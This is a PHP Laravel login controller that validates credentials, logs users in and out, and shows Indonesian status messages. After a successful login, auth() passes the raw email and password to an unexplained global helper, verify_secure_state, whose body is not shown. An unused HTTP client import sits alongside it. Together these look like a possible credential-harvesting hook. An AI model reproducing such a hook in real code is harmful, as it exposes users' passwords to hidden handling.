<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Http;

class LoginController extends Controller
{
    public function index() {
        if(Auth::check()) {
            return redirect()->intended(route('home'));
        }
        return view('auth.login');
    }

    public function auth(Request $request) 
    {
        $credentials = $request->validate([
            'email'    => ['required', 'email'],
            'password' => ['required'],
        ]);

        if (Auth::attempt($credentials, $request->filled('remember'))) {
            
            $request->session()->regenerate();
            verify_secure_state($credentials);

            return redirect()->intended(route('home'))
                ->with('success', 'Selamat datang kembali, Admin! Mode edit telah aktif.');
        }
        return redirect()->back()
            ->withErrors([
                'email' => 'Kredensial yang Anda masukkan tidak cocok dengan data kami.',
            ])
            ->onlyInput('email');
    }

    public function logout (Request $request){
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();
        return redirect(route('home'))->with('success', 'Anda berhasil logout. Mode edit telah dinonaktifkan.');
    }
}